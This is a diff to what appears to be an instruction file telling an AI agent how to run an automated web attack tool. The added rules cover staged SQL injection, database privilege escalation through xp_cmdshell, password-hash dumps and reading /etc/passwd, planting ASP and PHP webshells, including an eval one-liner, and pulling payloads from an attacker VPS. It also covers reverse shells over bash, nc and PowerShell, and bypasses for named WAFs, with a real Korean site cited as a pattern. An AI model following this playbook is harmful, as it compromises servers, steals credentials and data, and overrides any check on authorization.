@@ -279,6 +279,48 @@ When recon shows CUSTOM_WAF_DETECTED or HTTP 999:
     8. [NEW] SLEEP→heavy subquery
     9. [NEW] Chunked Transfer Encoding
 
+=== v2.4.0 AUTO-ENGINE DECISION RULES ===
+These engines are loaded automatically. AI must call them in order:
+
+[SQLi AUTO-STAGE ENGINE — bingo.tools.sqli_auto]
+  Decision order per parameter:
+    1. Error-Based  → detect SQL error string → use extract_value_error_based()
+    2. Union-Based  → auto column count 1-15 → build_union_payload()
+    3. Boolean-Blind→ TRUE/FALSE size diff >100B → binary char loop
+    4. Time-Based   → SLEEP/WAITFOR ≥ 0.8× expected → bit extraction
+    5. Stacked      → MSSQL/PGSQL semicolon side-effect
+  RULE: NEVER skip error-based before trying union. Try ALL 5 stages.
+  DB detection: detect_db_type(response_body) → auto-select DB payloads
+  DB types: mssql / mysql / postgresql / oracle / sqlite
+
+[DB PRIVESC AUTO ENGINE — bingo.tools.db_privesc]
+  MSSQL: sp_configure → xp_cmdshell enable → whoami
+         EXECUTE AS LOGIN='sa' → re-enable xp_cmdshell
+         sys.sql_logins password_hash dump
+  MySQL: INTO OUTFILE /var/www/html/shell.php → webshell
+         INTO DUMPFILE with hex payload
+  PostgreSQL: COPY TO PROGRAM 'id' → OS command
+              pg_read_file('/etc/passwd')
+  Oracle: UTL_HTTP OOB → UTL_FILE file read
+  RULE: run db_privesc AFTER confirming SQLi. Use result.method to decide webshell path.
+
+[SHELL DROPPER AUTO ENGINE — bingo.tools.shell_dropper]
+  MSSQL + xp_cmdshell confirmed:
+    → certutil base64 decode → {webroot}x.asp
+    → PowerShell DownloadFile from attacker VPS (lhost param)
+    → echo direct <%eval request(chr(120))%>
+  Verify shell: HTTP GET {base_url}/x.asp → 200 OK = deployed
+  Reverse shell auto-gen: gen_reverse_shell(lhost, lport)
+    → bash / python3 / nc / powershell_b64 / php_system
+
+WAF NEW SIGNATURES (auto-detected, auto-bypassed):
+  [dotDefender]  → header+space+keyword+chunked  (kar.or.kr pattern)
+  [Imperva]      → ua+header+encoding+space
+  [Wallarm]      → function+encoding+space
+  [360wzws]      → unicode+encoding+function
+  [anquanbao]    → unicode+encoding+function
+  [Nginx WAF]    → space+function+keyword
+
 === GNUBOARD5 / KOREAN CMS SPECIFIC RULES ===
 When fingerprint shows gnuboard5 / g5_ variables in page:
 
